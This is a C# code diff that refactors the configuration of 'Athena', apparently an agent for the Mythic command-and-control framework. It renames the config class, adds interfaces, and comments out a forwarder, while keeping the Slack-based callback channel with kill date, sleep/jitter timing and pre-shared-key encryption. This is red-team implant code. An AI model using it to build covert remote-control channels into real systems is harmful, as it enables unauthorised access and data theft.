@@ -8,19 +8,21 @@ using System.Collections.Specialized;
 using System.Linq;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
+using System.Xml.Linq;
+using Athena.Models.Config;
 
 namespace Athena
 {
-    public class MythicConfig
+    public class Config : IConfig
     {
-        public Slack currentConfig { get; set; }
+        public IProfile currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder { get; set; }
+        //public Forwarder forwarder { get; set; }
 
-        public MythicConfig()
+        public Config()
         {
 
             uuid = "%UUID%";
@@ -31,12 +33,12 @@ namespace Athena
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Slack();
-            this.forwarder = new Forwarder();
+            //this.forwarder = new Forwarder();
 
         }
     }
 
-    public class Slack
+    public class Slack : IProfile
     {
         public bool encrypted { get; set; }
         public PSKCrypto crypt { get; set; }
@@ -76,7 +78,7 @@ namespace Athena
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
+                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -130,7 +132,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
                 int i = 0;
